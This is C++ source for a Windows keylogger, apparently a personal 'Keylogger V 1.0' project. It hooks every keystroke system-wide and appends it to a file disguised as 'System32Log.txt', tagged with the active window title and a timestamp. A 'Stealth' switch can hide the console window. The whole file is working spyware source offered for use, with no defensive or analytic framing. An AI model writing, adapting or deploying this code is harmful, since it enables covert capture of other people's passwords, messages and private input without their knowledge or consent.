// Harsh Tuwar
// Keylogger V 1.0
// check passed

#include <Windows.h>
#include <time.h>
#include <iostream>
#include <cstdio>

// defines whether the window is visible or not
// should be solved with makefile, not in this file
#define visible // (visible / invisible)

// variable to store the handle of the hook
HHOOK _hook;

// This struct contains the data received by the hook callback. As you see in the callback function
// it contains the thing you will need: vkCode = virtual key code.
KBDLLHOOKSTRUCT kbdStruct;

int Save(int key_stroke, char *file);

extern char lastwindow[256];


//this function will be called when the key is pressed
LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode >= 0)
	{
		// valid
		if (wParam == WM_KEYDOWN)
		{
			
			kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);

			// this will save to file
			Save(kbdStruct.vkCode, "System32Log.txt");
		}
	}

	// next hook, This is nessecary or your hook chain will break
	return CallNextHookEx(_hook, nCode, wParam, lParam);
}

void SetHook()
{
	// Set the hook and set it to use the callback function above
	
	if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
	{
		MessageBox(NULL, "Failed to install hook!", "Error", MB_ICONERROR);
	}
}

void ReleaseHook()
{
	UnhookWindowsHookEx(_hook);
}

int Save(int key_stroke, char *file)
{
	char lastwindow[256];
	//this will ignore mouse clicks
	if ((key_stroke == 1) || (key_stroke == 2))
		return 0; 


	FILE *OUTPUT_FILE;
	OUTPUT_FILE = fopen(file, "a+");


	HWND foreground = GetForegroundWindow();
	if (foreground)
	{
		char window_title[256];
		GetWindowText(foreground, window_title, 256);

		if (strcmp(window_title, lastwindow) != 0) {
			strcpy(lastwindow, window_title);

			// To get the time for th text file
			time_t t = time(NULL);
			struct tm *tm = localtime(&t);
			char s[64];
			strftime(s, sizeof(s), "%c", tm);

			fprintf(OUTPUT_FILE, "\n\n[Window: %s - at %s] ", window_title, s);
		}
	}


	std::cout << key_stroke << '\n';

	if (key_stroke == VK_BACK)
		fprintf(OUTPUT_FILE, "%s", "[BACKSPACE]");
	else if (key_stroke == VK_RETURN)
		fprintf(OUTPUT_FILE, "%s", "\n");
	else if (key_stroke == VK_SPACE)
		fprintf(OUTPUT_FILE, "%s", " ");
	else if (key_stroke == VK_TAB)
		fprintf(OUTPUT_FILE, "%s", "[TAB]");
	else if (key_stroke == VK_SHIFT || key_stroke == VK_LSHIFT || key_stroke == VK_RSHIFT)
		fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
	else if (key_stroke == VK_CONTROL || key_stroke == VK_LCONTROL || key_stroke == VK_RCONTROL)
		fprintf(OUTPUT_FILE, "%s", "[CONTROL]");
	else if (key_stroke == VK_ESCAPE)
		fprintf(OUTPUT_FILE, "%s", "[ESCAPE]");
	else if (key_stroke == VK_END)
		fprintf(OUTPUT_FILE, "%s", "[END]");
	else if (key_stroke == VK_HOME)
		fprintf(OUTPUT_FILE, "%s", "[HOME]");
	else if (key_stroke == VK_LEFT)
		fprintf(OUTPUT_FILE, "%s", "[LEFT]");
	else if (key_stroke == VK_UP)
		fprintf(OUTPUT_FILE, "%s", "[UP]");
	else if (key_stroke == VK_RIGHT)
		fprintf(OUTPUT_FILE, "%s", "[RIGHT]");
	else if (key_stroke == VK_DOWN)
		fprintf(OUTPUT_FILE, "%s", "[DOWN]");
	else if (key_stroke == 190 || key_stroke == 110)
		fprintf(OUTPUT_FILE, "%s", ".");
	else if (key_stroke == 189 || key_stroke == 109)
		fprintf(OUTPUT_FILE, "%s", "-");
	else if (key_stroke == 20)
		fprintf(OUTPUT_FILE, "%s", "[CAPSLOCK]");
	else {
		if (key_stroke >= 96 && key_stroke <= 105)
		{
			key_stroke -= 48;
		}
		else if (key_stroke >= 65 && key_stroke <= 90) { // A-Z
			//this will going to check for the capslock
			bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);

			// this will check for the shift key
			if ((GetKeyState(VK_SHIFT) & 0x0001) != 0 || (GetKeyState(VK_LSHIFT) & 0x0001) != 0 || (GetKeyState(VK_RSHIFT) & 0x0001) != 0) {
				lowercase = !lowercase;
			}

			if (lowercase) key_stroke += 32;
		}
		fprintf(OUTPUT_FILE, "%c", key_stroke);
	}
	

	fclose(OUTPUT_FILE);
	return 0;
}

void Stealth()
{
#ifdef visible
	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1); 
#endif 

#ifdef invisible
	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); 
#endif 
}

int main()
{
	//visibility
	Stealth();

	//hook
	SetHook();

	//Loop to make the cossole running
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0))
	{
	}
}